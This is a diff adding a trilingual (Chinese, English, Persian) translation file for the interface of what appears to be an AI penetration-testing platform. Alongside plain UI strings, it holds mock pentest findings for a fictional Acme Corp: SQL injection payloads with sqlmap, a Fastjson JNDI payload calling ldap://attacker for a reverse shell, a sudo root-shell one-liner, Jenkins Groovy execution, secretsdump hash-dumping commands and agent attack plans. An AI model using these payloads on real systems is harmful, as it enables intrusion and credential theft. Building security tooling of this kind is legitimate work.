+    "en": " in the conversation…",
+    "fa": " در گفتگو…"
+  },
+  "重试定位": {
+    "en": "Try locating again",
+    "fa": "تلاش دوباره برای یافتن"
+  },
+  "取消定位": {
+    "en": "Cancel locating",
+    "fa": "لغو یافتن"
+  },
+  "对话 #": {
+    "en": "Conversation #",
+    "fa": "گفتگو #"
+  },
+  "定位审批 #": {
+    "en": "Locate approval #",
+    "fa": "یافتن تأیید #"
+  },
+  " 的来源：": {
+    "en": "'s source: ",
+    "fa": "، منبع: "
+  },
+  "以下为本次实际发送给审查模型的输入快照。背景仅用于理解当前动作，裁决依据为审查策略。": {
+    "en": "This is the input snapshot actually sent to the review model. The background is only there to explain the current action. The decision follows the review policy.",
+    "fa": "این نمای ورودی است که واقعاً به مدل بررسی فرستاده شده. پس‌زمینه فقط برای فهم کار فعلی است. مبنای رأی، سیاست بررسی است."
+  },
+  "查看完整模型审查输入 JSON": {
+    "en": "View the full model-review input JSON",
+    "fa": "دیدن JSON کامل ورودی بررسی مدل"
+  },
+  " · 工具请求": {
+    "en": " · tool request",
+    "fa": " · درخواست ابزار"
+  },
+  "查看命令内容": {
+    "en": "View command contents",
+    "fa": "دیدن محتوای فرمان"
+  },
+  "执行结果：": {
+    "en": "Result: ",
+    "fa": "نتیجه اجرا: "
+  },
+  "最终动作：": {
+    "en": "Final action: ",
+    "fa": "اقدام نهایی: "
+  },
+  "详情加载失败：": {
+    "en": "Failed to load details: ",
+    "fa": "بارگذاری جزئیات ناموفق بود: "
+  },
+  "保存于": {
+    "en": "Saved at",
+    "fa": "ذخیره‌شده در"
+  },
+  "的会话记录片段。模型实际使用的内容以“模型审查输入”为准。": {
+    "en": " session excerpt. What the model actually used is the \"model review input\".",
+    "fa": " بریده سابقه نشست. آنچه مدل واقعاً استفاده کرده «ورودی بررسی مدل» است."
+  },
+  " · 异常": {
+    "en": " · error",
+    "fa": " · خطا"
+  },
+  "工具调用 ID：": {
+    "en": "Tool call ID: ",
+    "fa": "شناسه فراخوانی ابزار: "
+  },
+  "参数摘要 SHA-256：": {
+    "en": "Parameter digest SHA-256: ",
+    "fa": "خلاصه پارامتر SHA-256: "
+  },
+  "审查配置指纹 SHA-256：": {
+    "en": "Review-config fingerprint SHA-256: ",
+    "fa": "اثرانگشت پیکربندی بررسی SHA-256: "
+  },
+  "模型审查输入 SHA-256：": {
+    "en": "Model-review input SHA-256: ",
+    "fa": "ورودی بررسی مدل SHA-256: "
+  },
+  "结果记录时间：": {
+    "en": "Result recorded at: ",
+    "fa": "زمان ثبت نتیجه: "
+  },
+  "审批 #": {
+    "en": " approval #",
+    "fa": " تأیید #"
+  },
+  "收起": {
+    "en": "Collapse",
+    "fa": "جمع کردن"
+  },
+  "审批详情 #": {
+    "en": "Approval details #",
+    "fa": "جزئیات تأیید #"
+  },
+  "规则 #": {
+    "en": "Rule #",
+    "fa": "قاعده #"
+  },
+  "记录加载失败：": {
+    "en": "Failed to load records: ",
+    "fa": "بارگذاری رکوردها ناموفق بود: "
+  },
+  "。请点击刷新重试。": {
+    "en": ". Click refresh to try again.",
+    "fa": ". برای تلاش دوباره، نوسازی را بزنید."
+  },
+  "待审批加载失败：": {
+    "en": "Failed to load pending approvals: ",
+    "fa": "بارگذاری تأییدهای در انتظار ناموفق بود: "
+  },
+  "待处理（": {
+    "en": "Pending (",
+    "fa": "در انتظار ("
+  },
+  "找到 ": {
+    "en": "Found ",
+    "fa": "پیدا شد "
+  },
+  "添加一条": {
+    "en": "Add one",
+    "fa": "افزودن یکی"
+  },
+  "继承自任务 #": {
+    "en": "Inherited from task #",
+    "fa": "به ارث رسیده از وظیفه #"
+  },
+  "，只读": {
+    "en": ", read-only",
+    "fa": "، فقط‌خواندنی"
+  },
+  "（继承，只读）": {
+    "en": "(inherited, read-only)",
+    "fa": "(به ارث رسیده، فقط‌خواندنی)"
+  },
+  "压缩的节点（": {
+    "en": "Collapsed nodes (",
+    "fa": "گره‌های فشرده‌شده ("
+  },
+  "另有": {
+    "en": "And",
+    "fa": "و"
+  },
+  "个成员节点未随当前图加载": {
+    "en": "more member nodes were not loaded with the current graph",
+    "fa": "گره عضو دیگر با گراف فعلی بارگذاری نشده است"
+  },
+  "发起复测失败：": {
+    "en": "Failed to start the retest: ",
+    "fa": "شروع آزمون مجدد ناموفق بود: "
+  },
+  "复测漏洞 #": {
+    "en": "Retest vulnerability #",
+    "fa": "آزمون مجدد آسیب‌پذیری #"
+  },
+  "复测 Agent\n            将读取原证据和测试约束，在独立会话中执行针对性验证。复测成功完成且确认修复后，漏洞状态自动改为「已修复」，其他结论保留原状态。": {
+    "en": "The retest Agent reads the original evidence and the test constraints, then runs a focused check in its own session. If the retest finishes and the fix is confirmed, the vulnerability status changes to \"Fixed\". Any other result keeps the original status.",
+    "fa": "Agent آزمون مجدد شواهد اصلی و محدودیت‌های آزمون را می‌خواند و بررسی هدفمند را در نشست جدا اجرا می‌کند. اگر آزمون مجدد تمام شود و رفع شدن تأیید گردد، وضعیت آسیب‌پذیری به «رفع‌شده» تغییر می‌کند. هر نتیجه دیگر وضعیت اصلی را نگه می‌دارد."
+  },
+  "发起复测": {
+    "en": "Start retest",
+    "fa": "شروع آزمون مجدد"
+  },
+  "加载复测记录失败：": {
+    "en": "Failed to load retest records: ",
+    "fa": "بارگذاری سابقه آزمون مجدد ناموفق بود: "
+  },
+  "补充说明：": {
+    "en": "Notes: ",
+    "fa": "توضیح تکمیلی: "
+  },
+  "证据 #": {
+    "en": "Evidence #",
+    "fa": "شاهد #"
+  },
+  "查看报文": {
+    "en": "View message",
+    "fa": "دیدن پیام"
+  },
+  "编辑说明": {
+    "en": "Edit note",
+    "fa": "ویرایش توضیح"
+  },
+  "上移证据 ": {
+    "en": "Move evidence up ",
+    "fa": "انتقال شاهد به بالا "
+  },
+  "下移证据 ": {
+    "en": "Move evidence down ",
+    "fa": "انتقال شاهد به پایین "
+  },
+  "解除绑定": {
+    "en": "Unbind",
+    "fa": "لغو اتصال"
+  },
+  "保存说明": {
+    "en": "Save note",
+    "fa": "ذخیره توضیح"
+  },
+  "已关联 ": {
+    "en": "Linked ",
+    "fa": "پیوند شد "
+  },
+  " 条流量到漏洞 #": {
+    "en": " traffic items to vulnerability #",
+    "fa": " مورد ترافیک به آسیب‌پذیری #"
+  },
+  "将所选": {
+    "en": "Save the selected",
+    "fa": "ذخیره انتخاب‌شده"
+  },
+  "条流量保存为已有漏洞的证据。": {
+    "en": "traffic items as evidence for an existing vulnerability.",
+    "fa": "مورد ترافیک به‌عنوان شاهد یک آسیب‌پذیری موجود."
+  },
+  "页 · 共": {
+    "en": "of",
+    "fa": "از"
+  },
+  "已选漏洞：#": {
+    "en": "Selected vulnerability: #",
+    "fa": "آسیب‌پذیری انتخاب‌شده: #"
+  },
+  "搜索": {
+    "en": "Search ",
+    "fa": "جستجوی "
+  },
+  "搜索失败：": {
+    "en": "Search failed: ",
+    "fa": "جستجو ناموفق بود: "
+  },
+  "。请重新输入重试。": {
+    "en": ". Change the text and try again.",
+    "fa": ". متن را عوض کنید و دوباره تلاش کنید."
+  },
+  "没有匹配记录，请更换名称、地址或 ID": {
+    "en": "No matching records. Try another name, address, or ID.",
+    "fa": "رکورد منطبقی نیست. نام، نشانی یا ID دیگری را امتحان کنید."
+  },
+  "已显示 ": {
+    "en": "Showing ",
+    "fa": "نمایش "
+  },
+  " 条，向下滚动加载更多": {
+    "en": " items. Scroll down to load more",
+    "fa": " مورد. برای موارد بیشتر به پایین بروید"
+  },
+  "已显示全部 ": {
+    "en": "Showing all ",
+    "fa": "نمایش همه "
+  },
+  "移除引用 ": {
+    "en": "Remove reference ",
+    "fa": "حذف ارجاع "
+  },
+  "example.com\n203.0.113.10\n198.51.100.0/24\n京ICP备12345678号-1\n企业名称关键词": {
+    "en": "example.com\n203.0.113.10\n198.51.100.0/24\n京ICP备12345678号-1\nCompany name keyword",
+    "fa": "example.com\n203.0.113.10\n198.51.100.0/24\n京ICP备12345678号-1\nکلیدواژه نام شرکت"
+  },
+  "已识别": {
+    "en": "Recognized",
+    "fa": "شناسایی‌شده"
+  },
+  "行：": {
+    "en": ": ",
+    "fa": ": "
+  },
+  "行错误": {
+    "en": "more lines have errors",
+    "fa": "خط دیگر خطا دارد"
+  },
+  "上下文更新于": {
+    "en": "Context updated at",
+    "fa": "زمینه به‌روز شد در"
+  },
+  "加载更早的旁路问答": {
+    "en": "Load earlier side questions",
+    "fa": "بارگذاری پرسش‌های جانبی قدیمی‌تر"
+  },
+  "上下文": {
+    "en": "Context",
+    "fa": "زمینه"
+  },
+  "组问答原文": {
+    "en": "raw Q&A exchanges",
+    "fa": "تبادل خام پرسش و پاسخ"
+  },
+  "删除当前 Agent 的旁路问答，并停止正在生成的旁路回答。主会话和上下文快照会保留。": {
+    "en": "Delete this Agent's side questions and stop any side answer that is still generating. The main session and the context snapshot are kept.",
+    "fa": "پرسش‌های جانبی این Agent را حذف کنید و پاسخ جانبی در حال تولید را متوقف کنید. نشست اصلی و نمای زمینه می‌مانند."
+  },
+  "的独立问答": {
+    "en": " separate Q&A",
+    "fa": " پرسش و پاسخ جدا"
+  },
+  "/ 共": {
+    "en": "of",
+    "fa": "از"
+  },
+  "备用": {
+    "en": "Fallback",
+    "fa": "جایگزین"
+  },
+  "新建模板": {
+    "en": "New template",
+    "fa": "قالب جدید"
+  },
+  "应用模板时预填这些任务级规则（拦截/允许，仅对新任务生效，不进全局）。": {
+    "en": "When a template is applied, these task-level rules are prefilled (block/allow). They apply only to new tasks and are not added to the global rules.",
+    "fa": "هنگام اعمال قالب، این قاعده‌های سطح وظیفه از پیش پر می‌شوند (مسدود/مجاز). فقط روی وظیفه‌های جدید اثر دارند و به قاعده‌های سراسری اضافه نمی‌شوند."
+  },
+  "删除模板": {
+    "en": "Delete template",
+    "fa": "حذف قالب"
+  },
+  "删除模板「": {
+    "en": "Delete template「",
+    "fa": "حذف قالب「"
+  },
+  "加载模板失败：": {
+    "en": "Failed to load the template: ",
+    "fa": "بارگذاری قالب ناموفق بود: "
+  },
+  "管理模板": {
+    "en": "Manage templates",
+    "fa": "مدیریت قالب‌ها"
+  },
+  "另存为模板": {
+    "en": "Save as template",
+    "fa": "ذخیره به‌عنوان قالب"
+  },
+  "使用模板「": {
+    "en": "Use template「",
+    "fa": "استفاده از قالب「"
+  },
+  "覆盖并使用": {
+    "en": "Overwrite and use",
+    "fa": "بازنویسی و استفاده"
+  },
+  "最近 Todo": {
+    "en": "Recent Todos",
+    "fa": "Todoهای اخیر"
+  },
+  "流量证据 #": {
+    "en": "Traffic evidence #",
+    "fa": "شاهد ترافیک #"
+  },
+  "字节": {
+    "en": "bytes",
+    "fa": "بایت"
+  },
+  "下载完整": {
+    "en": "Download full content",
+    "fa": "دانلود کامل"
+  },
+  "加载更多正文": {
+    "en": "Load more of the body",
+    "fa": "بارگذاری ادامه متن"
+  },
+  "流量 ID：": {
+    "en": "Traffic ID: ",
+    "fa": "شناسه ترافیک: "
+  },
+  "。绑定时会保存完整正文。": {
+    "en": ". Binding saves the full body.",
+    "fa": ". هنگام اتصال، متن کامل ذخیره می‌شود."
+  },
+  "筛选并多选请求/响应，已选记录会跨页保留。绑定后可设置用途、说明和顺序。": {
+    "en": "Filter and multi-select requests and responses. The selection is kept across pages. After binding, you can set the purpose, note, and order.",
+    "fa": "درخواست و پاسخ را فیلتر کنید و چندتایی انتخاب کنید. انتخاب بین صفحه‌ها می‌ماند. پس از اتصال می‌توانید کاربرد، توضیح و ترتیب را تنظیم کنید."
+  },
+  "预览": {
+    "en": "Preview",
+    "fa": "پیش‌نمایش"
+  },
+  "条 · 共": {
+    "en": "of",
+    "fa": "از"
+  },
+  "绑定 ": {
+    "en": "Bind ",
+    "fa": "اتصال "
+  },
+  "定位的工具调用 #": {
+    "en": "Located tool call #",
+    "fa": "فراخوانی ابزار یافته‌شده #"
+  },
+  "实时流式中…": {
+    "en": "Live streaming…",
+    "fa": "در حال پخش زنده…"
+  },
+  "# ARTEX 渗透测试报告 — Acme Corp\n\n## 概览\n- 范围：acme.com（含 www / admin / api / shop / vpn 子域）\n- 已确认发现：6 项（高危 3 · 中危 3 · 低危 2）\n- 引擎模式：exploring\n\n## 关键发现\n1. **[高] 后台默认口令** admin.acme.com admin/admin123 → 可完全接管后台。\n2. **[高] SQL 注入** www.acme.com/search?q= → 可读取 acme_prod 库。\n3. **[高] IDOR** api.acme.com/v1/orders?id= → 可越权读取他人订单（含手机号/地址）。\n4. **[中] 反射型 XSS**、**暴露 .git 源码**、**登录无速率限制**。\n\n## 建议\n- 后台强制改密 + 启用 MFA、封禁默认口令。\n- search 接口参数化查询、输出编码。\n- API 增加对象级授权校验（IDOR）、更换强 JWT 密钥。\n\n> （demo）本报告由 mock 数据生成，仅用于界面演示。": {
+    "en": "# ARTEX Penetration Test Report — Acme Corp\n\n## Overview\n- Scope: acme.com (including the www / admin / api / shop / vpn subdomains)\n- Confirmed findings: 6 (3 high · 3 medium · 2 low)\n- Engine mode: exploring\n\n## Key findings\n1. **[High] Default admin password** admin.acme.com admin/admin123 → full takeover of the admin console.\n2. **[High] SQL injection** www.acme.com/search?q= → can read the acme_prod database.\n3. **[High] IDOR** api.acme.com/v1/orders?id= → can read other users' orders (including phone numbers and addresses) without authorization.\n4. **[Medium] Reflected XSS**, **exposed .git source**, **no rate limit on login**.\n\n## Recommendations\n- Force a password change on the admin console, enable MFA, and ban default passwords.\n- Use parameterized queries on the search endpoint, and encode output.\n- Add object-level authorization checks on the API (IDOR), and rotate to a strong JWT secret.\n\n> (demo) This report was generated from mock data and is only for interface demonstration.",
+    "fa": "# گزارش آزمون نفوذ ARTEX — Acme Corp\n\n## نمای کلی\n- محدوده: acme.com (شامل زیردامنه‌های www / admin / api / shop / vpn)\n- یافته‌های تأییدشده: ۶ (۳ بالا · ۳ متوسط · ۲ پایین)\n- حالت موتور: exploring\n\n## یافته‌های کلیدی\n1. **[بالا] گذرواژه پیش‌فرض مدیریت** admin.acme.com admin/admin123 → تصرف کامل کنسول مدیریت.\n2. **[بالا] تزریق SQL** www.acme.com/search?q= → امکان خواندن پایگاه acme_prod.\n3. **[بالا] IDOR** api.acme.com/v1/orders?id= → خواندن بدون مجوز سفارش دیگران (شامل تلفن و نشانی).\n4. **[متوسط] XSS بازتابی**، **افشای سورس .git**، **نبود محدودیت نرخ در ورود**.\n\n## پیشنهادها\n- اجبار به تغییر گذرواژه مدیریت، فعال کردن MFA، و مسدود کردن گذرواژه پیش‌فرض.\n- پرس‌وجوی پارامتریک در رابط search و کدگذاری خروجی.\n- بررسی مجوز در سطح شیء برای API (IDOR) و تعویض کلید قوی JWT.\n\n> (demo) این گزارش از داده آزمایشی ساخته شده و فقط برای نمایش رابط است."
+  },
+  "上传失败: ": {
+    "en": "Upload failed: ",
+    "fa": "بارگذاری ناموفق: "
+  },
+  " 的下载内容示例。": {
+    "en": " sample download contents.",
+    "fa": " نمونه محتوای دانلود."
+  },
+  "下载失败: ": {
+    "en": "Download failed: ",
+    "fa": "دانلود ناموفق: "
+  },
+  "上传失败(": {
+    "en": "Upload failed (",
+    "fa": "بارگذاری ناموفق ("
+  },
+  "最多 ": {
+    "en": "At most ",
+    "fa": "حداکثر "
+  },
+  "## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n": {
+    "en": "## Overview\n\nThe `q` parameter on `www.acme.com/search` has **error-based SQL injection** (MSSQL). It can read the database version, schema, and sensitive data.\n\n## Impact\n\n- Table layout and user/order data in the `acme_prod` database can be read\n- Error messages make exploitation quick to build, so the risk is high\n\n## Steps to reproduce\n\n1. Trigger the error-based injection:\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. The response echoes an MSSQL version error, confirming injection\n3. Enumerate databases further: `sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## Remediation\n\n- Use parameterized queries or prepared statements everywhere, and stop concatenating strings\n- Turn off detailed error output in production\n- Give the database account least privilege, and disable dangerous extensions such as `xp_cmdshell`\n",
+    "fa": "## نمای آسیب‌پذیری\n\nپارامتر `q` در `www.acme.com/search` **تزریق SQL مبتنی بر خطا** (MSSQL) دارد و می‌تواند نسخه پایگاه، ساختار و داده حساس را بخواند.\n\n## اثر\n\n- ساختار جدول‌ها و داده کاربر/سفارش در پایگاه `acme_prod` قابل خواندن است\n- بازتاب خطا ساخت سوءاستفاده را سریع می‌کند و ریسک بالاست\n\n## گام‌های بازتولید\n\n1. تزریق مبتنی بر خطا را فعال کنید:\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. پاسخ، خطای نسخه MSSQL را برمی‌گرداند و تزریق را تأیید می‌کند\n3. پایگاه‌ها را بیشتر بشمارید: `sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## پیشنهاد رفع\n\n- همه‌جا از پرس‌وجوی پارامتریک یا عبارت آماده استفاده کنید و الحاق رشته را کنار بگذارید\n- نمایش خطای مفصل را در محیط تولید خاموش کنید\n- حساب پایگاه کمترین دسترسی را داشته باشد و افزونه‌های خطرناک مانند `xp_cmdshell` غیرفعال شوند\n"
+  },
+  "## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n": {
+    "en": "## Overview\n\nThe `/api/import` endpoint on `shop.acme.com` parses user-controlled JSON with **Fastjson 1.2.24** and does not enable `safeMode`. An attacker can set `@type` to any class and trigger **JNDI injection → remote command execution**.\n\n## Impact\n\n- An unauthenticated attacker can run arbitrary commands on the DMZ web server (`www-data@dmz-web01`)\n- With a later privilege escalation, that host becomes a foothold into the internal network\n\n## Steps to reproduce\n\n1. Build a JNDI payload:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import` with `Content-Type: application/json`\n3. The target calls back to dnslog and a reverse shell lands\n\n## Remediation\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- Add authentication and origin checks on `/api/import`\n- Restrict egress: block business servers from opening LDAP/RMI connections\n",
+    "fa": "## نمای آسیب‌پذیری\n\nرابط `/api/import` در `shop.acme.com` JSON تحت کنترل کاربر را با **Fastjson 1.2.24** تجزیه می‌کند و `safeMode` روشن نیست. مهاجم می‌تواند با `@type` هر کلاسی را مشخص کند و **تزریق JNDI → اجرای فرمان از راه دور** را راه بیندازد.\n\n## اثر\n\n- مهاجم بدون احراز هویت می‌تواند فرمان دلخواه را روی سرور وب DMZ اجرا کند (`www-data@dmz-web01`)\n- با ارتقای دسترسی بعدی، این میزبان سکوی ورود به شبکه داخلی می‌شود\n\n## گام‌های بازتولید\n\n1. payload مربوط به JNDI را بسازید:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import` با `Content-Type: application/json`\n3. هدف به dnslog برمی‌گردد و reverse shell مستقر می‌شود\n\n## پیشنهاد رفع\n\n- Fastjson را به **1.2.83+** ارتقا دهید و `safeMode` را روشن کنید\n- برای `/api/import` احراز هویت و بررسی مبدأ اضافه کنید\n- خروجی شبکه را محدود کنید: اتصال فعال LDAP/RMI از سرورهای کسب‌وکار ممنوع شود\n"
+  },
+  "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。": {
+    "en": "sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' gets root directly.",
+    "fa": "sudo -l نشان می‌دهد (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' مستقیم root می‌دهد."
+  },
+  "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。": {
+    "en": "GET /script runs Groovy with no login: 'whoami'.execute().text → SYSTEM; and the domain account acme\\svc_deploy is exported from the credential store.",
+    "fa": "GET /script بدون ورود Groovy اجرا می‌کند: 'whoami'.execute().text → SYSTEM؛ و حساب دامنه acme\\svc_deploy از مخزن اعتبارنامه بیرون کشیده می‌شود."
+  },
+  "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n": {
+    "en": "## Overview\n\nStarting from Fastjson RCE on the internet-facing host, the tester landed in the DMZ, escalated with sudo, crossed a dual-homed host, and used unauthenticated Jenkins RCE to obtain the domain account `svc_deploy`. That account is in **Domain Admins** and ended with full control of domain controller **DC01**.\n\n## Impact\n\n- Domain administrator rights, enough to control every host and account in the domain\n- `secretsdump` exported every domain NTLM hash (including `krbtgt`), which can be used to forge a golden ticket and stay resident\n- The internal objective was met\n\n## Steps to reproduce\n\n1. Sign in as `svc_deploy` and dump hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain SYSTEM on DC01 and export every hash in the domain\n\n## Remediation\n\n- Reduce service-account rights, remove them from Domain Admins, and apply tiered administration\n- Reset `krbtgt` twice in a row, and rotate strong passwords for service accounts\n- Repair DMZ-to-internal isolation and the RCE and privilege-escalation chain above\n",
+    "fa": "## نمای آسیب‌پذیری\n\nاز RCE مربوط به Fastjson در میزبان رو به اینترنت، جای پا در DMZ گرفته شد؛ سپس با sudo دسترسی بالا رفت، از میزبان دونیک عبور کرد و با RCE بدون احراز هویت Jenkins حساب دامنه `svc_deploy` به دست آمد. این حساب عضو **Domain Admins** است و در پایان کنترل کامل کنترل‌کننده دامنه **DC01** را داد.\n\n## اثر\n\n- حق مدیر دامنه، کافی برای کنترل همه میزبان‌ها و حساب‌های دامنه\n- `secretsdump` همه هش‌های NTLM دامنه (از جمله `krbtgt`) را بیرون کشید؛ با آن می‌توان بلیت طلایی ساخت و ماندگار شد\n- هدف داخلی محقق شد\n\n## گام‌های بازتولید\n\n1. با `svc_deploy` وارد شوید و هش‌ها را بیرون بکشید:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. دسترسی SYSTEM روی DC01 را بگیرید و همه هش‌های دامنه را صادر کنید\n\n## پیشنهاد رفع\n\n- دسترسی حساب‌های سرویس را کم کنید، آن‌ها را از Domain Admins خارج کنید و مدیریت لایه‌ای (tiering) را اجرا کنید\n- `krbtgt` را دو بار پشت سر هم بازنشانی کنید و گذرواژه قوی حساب‌های سرویس را عوض کنید\n- جداسازی مرز DMZ تا شبکه داخلی و زنجیره RCE و ارتقای دسترسی بالا را درست کنید\n"
+  },
+  "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令": {
+    "en": "Exported the plaintext password of domain account acme\\svc_deploy from the Jenkins credential store",
+    "fa": "گذرواژه متن روشن حساب دامنه acme\\svc_deploy از مخزن اعتبارنامه Jenkins بیرون کشیده شد"
+  },
+  "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征": {
+    "en": "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By absent, body matches element-ui/vue fingerprints",
+    "fa": "acme.com → 302 → www؛ Server: nginx/1.24.0\nadmin.acme.com → 200، X-Powered-By نیست، بدنه با اثر انگشت element-ui/vue جور است"
+  },
+  "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。": {
+    "en": "intents=[\n  { summary: 'Enumerate every acme.com subdomain and identify ports and services on live hosts to map the attack surface', asset_ids: [acme.com], priority: 6 },\n  { summary: 'Test admin.acme.com for default and weak passwords (Element-UI login, no captcha)', asset_ids: [admin], priority: 9 },\n  { summary: 'Probe the q parameter on www.acme.com/search for SQL injection', asset_ids: [www], priority: 8 },\n  { summary: 'Test the api.acme.com order API for broken object-level authorization (IDOR)', asset_ids: [api], priority: 8 },\n]\nparent_ids are all empty (new top-level directions, falling back to the origin fact).",
+    "fa": "intents=[\n  { summary: 'شمارش همه زیردامنه‌های acme.com و شناسایی درگاه و سرویس میزبان‌های زنده برای نقشه سطح حمله', asset_ids: [acme.com], priority: 6 },\n  { summary: 'آزمون گذرواژه پیش‌فرض و ضعیف admin.acme.com (ورود Element-UI، بدون کپچا)', asset_ids: [admin], priority: 9 },\n  { summary: 'بررسی پارامتر q در www.acme.com/search برای تزریق SQL', asset_ids: [www], priority: 8 },\n  { summary: 'آزمون مجوز سطح شیء (IDOR) در رابط سفارش api.acme.com', asset_ids: [api], priority: 8 },\n]\nparent_ids همگی خالی‌اند (جهت‌های تازه سطح بالا، با اتصال پشتیبان به origin fact)."
+  },
+  "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。": {
+    "en": "intents=[\n  { summary: 'Deepen component fingerprints on shop.acme.com and tie Fastjson 1.2.24 to the exact CVE (confirm the gadget chain)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Build a Fastjson deserialization payload to trigger RCE on shop and obtain a reverse shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: this is a strictly serial chain. TodoWrite already records the three steps fingerprint → RCE → foothold privilege escalation. This round dispatches only the first two (escalation depends on a shell, so it waits for the next round).",
+    "fa": "intents=[\n  { summary: 'عمق دادن به اثر انگشت مؤلفه shop.acme.com و تطبیق دقیق Fastjson 1.2.24 با CVE (تأیید زنجیره gadget)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'ساخت payload سریال‌زدایی Fastjson برای RCE روی shop و گرفتن reverse shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nیادداشت: این یک زنجیره سریال با وابستگی سخت است. TodoWrite سه گام «اثر انگشت → RCE → ارتقای دسترسی از جای پا» را ثبت کرده. این دور فقط دو گام اول را می‌فرستد (ارتقای دسترسی به خروجی shell وابسته است و دور بعد می‌رود)."
+  },
+  "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。": {
